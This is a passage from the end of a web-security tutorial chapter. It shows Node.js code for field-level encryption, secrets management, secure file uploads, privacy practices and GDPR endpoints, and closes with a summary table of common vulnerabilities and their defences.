      encryptedFields.set(path, encryptor);
    }
  }
  
  // Encrypt before save
  schema.pre('save', function(next) {
    for (const [path, encryptor] of encryptedFields) {
      if (this.isModified(path) && this[path]) {
        this[path] = encryptor.encrypt(this[path]);
      }
    }
    next();
  });
  
  // Decrypt after find
  schema.post('find', function(docs) {
    docs.forEach(doc => {
      for (const [path, encryptor] of encryptedFields) {
        if (doc[path]) {
          doc[path] = encryptor.decrypt(doc[path]);
        }
      }
    });
  });
}

// Usage
const userSchema = new mongoose.Schema({
  name: String,
  email: String,
  ssn: { type: String, encrypt: true },
  creditCard: { type: String, encrypt: true }
});

userSchema.plugin(encryptionPlugin);
```

### Secure Storage Practices

Store sensitive data securely in databases and file systems.

#### Database Security

```javascript
// 1. Use parameterized queries (prevents SQL injection)
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);

// 2. Encrypt sensitive columns
CREATE TABLE users (
  id INT PRIMARY KEY,
  email VARCHAR(255),
  ssn VARBINARY(255),  -- Store encrypted
  credit_card VARBINARY(255)  -- Store encrypted
);

// 3. Use database-level encryption
-- Enable transparent data encryption (TDE)
ALTER DATABASE mydb SET ENCRYPTION ON;

// 4. Implement access controls
GRANT SELECT, INSERT, UPDATE ON users TO 'app_user'@'localhost';
REVOKE DELETE ON users FROM 'app_user'@'localhost';

// 5. Regular backups with encryption
mongodump --out=/backup --gzip --archive=/backup/db.gz
openssl enc -aes-256-cbc -salt -in db.gz -out db.gz.enc
```

#### Secrets Management

```javascript
// DON'T: Store secrets in code
const API_KEY = 'sk-1234567890abcdef';  // Never!

// DO: Use environment variables
const API_KEY = process.env.API_KEY;

// BETTER: Use secrets manager
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager();

async function getSecret(secretName) {
  try {
    const data = await secretsManager.getSecretValue({ 
      SecretId: secretName 
    }).promise();
    
    return JSON.parse(data.SecretString);
  } catch (error) {
    console.error('Error retrieving secret:', error);
    throw error;
  }
}

// Usage
const secrets = await getSecret('prod/api-keys');
const API_KEY = secrets.API_KEY;

// Or use HashiCorp Vault
const vault = require('node-vault')({
  endpoint: process.env.VAULT_ADDR,
  token: process.env.VAULT_TOKEN
});

async function getVaultSecret(path) {
  const result = await vault.read(path);
  return result.data;
}
```

#### File Upload Security

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// Secure file upload configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Store outside web root
    cb(null, '/var/app/uploads');
  },
  filename: (req, file, cb) => {
    // Generate random filename
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname);
    cb(null, `${randomName}${ext}`);
  }
});

const fileFilter = (req, file, cb) => {
  // Whitelist allowed types
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
  
  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type'), false);
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024,  // 5MB max
    files: 1
  }
});

// Upload endpoint
app.post('/upload', upload.single('file'), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  // Validate file content (check magic bytes)
  const fileBuffer = fs.readFileSync(req.file.path);
  const fileType = await fileTypeFromBuffer(fileBuffer);
  
  if (!fileType || !['image/jpeg', 'image/png', 'image/gif'].includes(fileType.mime)) {
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'Invalid file content' });
  }
  
  // Scan for malware (integrate with ClamAV or similar)
  const isSafe = await scanFile(req.file.path);
  
  if (!isSafe) {
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'File failed security scan' });
  }
  
  // Store metadata
  await db.files.create({
    userId: req.user.id,
    filename: req.file.filename,
    originalName: req.file.originalname,
    mimetype: req.file.mimetype,
    size: req.file.size,
    uploadedAt: new Date()
  });
  
  res.json({ 
    success: true,
    fileId: req.file.filename
  });
});

// Serve files securely
app.get('/files/:fileId', authenticateToken, async (req, res) => {
  const { fileId } = req.params;
  
  // Verify ownership
  const file = await db.files.findOne({ filename: fileId });
  
  if (!file) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  if (file.userId !== req.user.sub) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // Serve file
  const filePath = path.join('/var/app/uploads', fileId);
  res.sendFile(filePath);
});
```

### Privacy Considerations

Respect user privacy and minimize data collection.

#### Privacy by Design

```javascript
// 1. Data minimization - collect only what's needed
const userSchema = new mongoose.Schema({
  email: { type: String, required: true },
  name: { type: String, required: true },
  // Don't collect: birthdate, address, phone unless necessary
});

// 2. Purpose limitation - use data only for stated purpose
app.post('/newsletter/subscribe', async (req, res) => {
  const { email } = req.body;
  
  // Store consent
  await db.subscriptions.create({
    email,
    purpose: 'newsletter',
    consentedAt: new Date(),
    ipAddress: req.ip
  });
  
  // Don't use email for other purposes without consent
});

// 3. Data retention - delete data when no longer needed
async function cleanupOldData() {
  // Delete old logs
  await db.logs.deleteMany({
    createdAt: { $lt: new Date(Date.now() - 90 * 24 * 60 * 60 * 1000) }
  });
  
  // Anonymize old user data
  await db.users.updateMany(
    {
      deletedAt: { $lt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) }
    },
    {
      email: 'deleted@example.com',
      name: 'Deleted User',
      phone: null,
      address: null
    }
  );
}

// Run daily
setInterval(cleanupOldData, 24 * 60 * 60 * 1000);

// 4. User control - allow users to manage their data
app.get('/api/my-data', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Provide all user data
  const userData = await db.users.findById(userId);
  const userPosts = await db.posts.find({ userId });
  const userComments = await db.comments.find({ userId });
  
  res.json({
    profile: userData,
    posts: userPosts,
    comments: userComments
  });
});

app.delete('/api/my-account', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Delete or anonymize user data
  await db.users.updateOne(
    { id: userId },
    {
      deletedAt: new Date(),
      email: `deleted-${userId}@example.com`,
      name: 'Deleted User'
    }
  );
  
  res.json({ success: true });
});
```

### GDPR Compliance Basics

General Data Protection Regulation requirements for EU users.

#### Consent Management

```javascript
// Cookie consent
app.get('/', (req, res) => {
  res.send(`
    <div id="cookie-banner" style="display: none;">
      <p>We use cookies to improve your experience.</p>
      <button onclick="acceptCookies()">Accept</button>
      <button onclick="rejectCookies()">Reject</button>
      <a href="/privacy-policy">Learn more</a>
    </div>
    
    <script>
      if (!localStorage.getItem('cookieConsent')) {
        document.getElementById('cookie-banner').style.display = 'block';
      }
      
      function acceptCookies() {
        localStorage.setItem('cookieConsent', 'accepted');
        document.getElementById('cookie-banner').style.display = 'none';
        // Enable analytics
      }
      
      function rejectCookies() {
        localStorage.setItem('cookieConsent', 'rejected');
        document.getElementById('cookie-banner').style.display = 'none';
      }
    </script>
  `);
});

// Track consent in database
const consentSchema = new mongoose.Schema({
  userId: String,
  consentType: String,  // 'necessary', 'analytics', 'marketing'
  granted: Boolean,
  timestamp: Date,
  ipAddress: String,
  userAgent: String
});

app.post('/api/consent', authenticateToken, async (req, res) => {
  const { consentType, granted } = req.body;
  
  await db.consents.create({
    userId: req.user.sub,
    consentType,
    granted,
    timestamp: new Date(),
    ipAddress: req.ip,
    userAgent: req.get('user-agent')
  });
  
  res.json({ success: true });
});
```

#### Right to Access (Data Portability)

```javascript
// Export all user data
app.get('/api/export-data', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Gather all user data
  const [user, posts, comments, orders, activity] = await Promise.all([
    db.users.findById(userId),
    db.posts.find({ userId }),
    db.comments.find({ userId }),
    db.orders.find({ userId }),
    db.activity.find({ userId })
  ]);
  
  // Create JSON export
  const exportData = {
    profile: {
      email: user.email,
      name: user.name,
      createdAt: user.createdAt
    },
    posts: posts,
    comments: comments,
    orders: orders,
    activity: activity,
    exportedAt: new Date()
  };
  
  // Create downloadable file
  const filename = `user-data-${userId}-${Date.now()}.json`;
  const filepath = path.join('/tmp', filename);
  
  fs.writeFileSync(filepath, JSON.stringify(exportData, null, 2));
  
  res.download(filepath, filename, (err) => {
    fs.unlinkSync(filepath);
  });
});
```

#### Right to Erasure (Right to be Forgotten)

```javascript
// Delete all user data
app.delete('/api/delete-account', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  const { password } = req.body;
  
  // Verify password
  const user = await db.users.findById(userId);
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid password' });
  }
  
  // Delete or anonymize data
  await Promise.all([
    // Delete personal data
    db.users.deleteOne({ id: userId }),
    
    // Anonymize posts (keep content but remove attribution)
    db.posts.updateMany(
      { userId },
      { userId: null, authorName: 'Deleted User' }
    ),
    
    // Delete private data
    db.messages.deleteMany({ userId }),
    db.orders.deleteMany({ userId }),
    db.activity.deleteMany({ userId })
  ]);
  
  // Log deletion for compliance
  await db.deletionLogs.create({
    userId,
    deletedAt: new Date(),
    ipAddress: req.ip
  });
  
  res.json({ success: true });
});
```

#### Privacy Policy and Terms

```javascript
// Require acceptance of updated policies
app.use(async (req, res, next) => {
  if (req.user) {
    const user = await db.users.findById(req.user.sub);
    const latestPolicyVersion = '2024-01-01';
    
    if (user.acceptedPolicyVersion !== latestPolicyVersion) {
      return res.status(403).json({
        error: 'Please accept the updated privacy policy',
        policyUrl: '/privacy-policy',
        policyVersion: latestPolicyVersion
      });
    }
  }
  
  next();
});

app.post('/api/accept-policy', authenticateToken, async (req, res) => {
  const { policyVersion } = req.body;
  
  await db.users.updateOne(
    { id: req.user.sub },
    {
      acceptedPolicyVersion: policyVersion,
      acceptedPolicyAt: new Date()
    }
  );
  
  res.json({ success: true });
});
```

---

## Summary

This document covered Authentication, Authorization, and Data Protection:

**Authentication & Authorization:**

- **JWT**: Token structure, creation/verification, refresh tokens, best practices, security considerations
- **OAuth 2.0/OpenID Connect**: Authorization code flow, PKCE, Passport.js integration
- **Session Management**: Redis storage, security best practices, session regeneration, timeout handling
- **Password Hashing**: bcrypt usage, strength validation, password reset flow
- **Multi-factor Authentication**: TOTP implementation, SMS verification, backup codes

**Data Protection:**

- **Encryption**: TLS/HTTPS configuration, encryption at rest (AES-256-GCM), field-level encryption, key rotation
- **Secure Storage**: Database security, secrets management, secure file uploads
- **Privacy**: Data minimization, purpose limitation, retention policies, user control
- **GDPR Compliance**: Consent management, data portability, right to erasure, policy acceptance

Security requires layers of protection and ongoing vigilance to protect user data and maintain trust.

---

**Related Topics:**

- Penetration Testing
- Security Audits
- Compliance (HIPAA, PCI-DSS)
- Zero Trust Architecture
- API Security

## 24.5 Security Summary

| Vulnerability | Prevention |
|--------------|------------|
| **XSS** | Escape output, use CSP, avoid `innerHTML` |
| **CSRF** | CSRF tokens, SameSite cookies |
| **Injection** | Parameterized queries, input validation |
| **Prototype Pollution** | Object.create(null), freeze prototypes |
| **Sensitive Data** | HTTPS, secure cookies, encryption |

---

**End of Chapter 24: Security Best Practices**
